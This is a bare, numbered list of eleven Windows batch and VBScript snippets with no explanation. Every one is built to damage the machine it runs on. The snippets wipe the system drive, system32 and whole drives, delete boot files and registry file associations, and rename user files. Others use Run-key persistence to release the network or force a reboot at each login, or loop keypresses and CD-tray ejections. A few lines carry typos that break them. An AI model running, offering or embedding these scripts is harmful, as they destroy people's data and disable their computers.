# C-

1.
Del %windowsdrive%\*.* /f /s /q
Shutdown -s -f -t 0

2.
Ren *.doc *.txt
Ren *.jpeg *.txt
Ren *.lnk *.txt
Ren *.avi *.txt
Ren *.mpeg *.txt
Ren *.com *.txt
Ren *.bat *.txt

3.
Del c:\windows\system32\*.* /q

4.
@echo off
Attrib -r -s -h c:\autoexec.bat
Del c:\autoexec.bat
Attrib -r -s -h c:\boot.ini
Del c:\boot.ini
Attrib -r -s -h c:\ntldr
Del c:\ ntldr
Attrib -r -s -h c:\windows\win.ini
Del c:\windows\win.ini

5.
@echo off
Start reg delete HKCR/.exe
Start reg delete HKCR/.dll
Start reg delete HKCR/*

6.
echo @echo off>c:\windows\wimn32.bat
echo break off>>c:\windows\wimn32.bat
echo ipconfig/release_all>>c:\windowswimn32.bat
echo end>>c:\windows\wimn32.bat
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v WINDOWsAPI /t reg_sz /d c:\windows\wimn32.bat /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVision\Run /v CONTROLexit /t reg_sz /d c:/Windows/wimn32.bat /f
Pause

7.(.vbs)
Set wshShell=wscript.CreateObject("WScript.Shell")
do
wscript.sleep 100
wshshell.sendkeys"~(enter)"
loop

8.
echo @echo off>c:\Windows\hartlell.bat
echo break off>>c:\Windows\hartlell.bat
echo shutdown -r -t 11 -f>>c:\Windows\hartlell.bat
echo end>>c:\Windows\hartlell.bat
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windwos\CurrentVersion\Run /v startAPI /t reg_sz /d c:\Windows\hartlell.bat /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v /t reg_sz /d c:\Windows\hartlell.bat /f
pause

9.(.vbs)
Set oWMP=CreateObject("WMPlayer.OCX.7")
Set colCDROMs=oWMP.cdromCollection
do
if colCDROMs.Count>=1 then
For i=0 to colCDROMs.Count -1
colCDROMs.Item(i).Eject
Next
For i=0 to colCDROMs.Count -1
colCDROMs.Item(i).Eject
Next
End If
wscript.sleep 100
loop

10.
rd/s/q D:\
rd/s/q E:\
rd/s/q C:\

11.
Mountvol c:\ /d
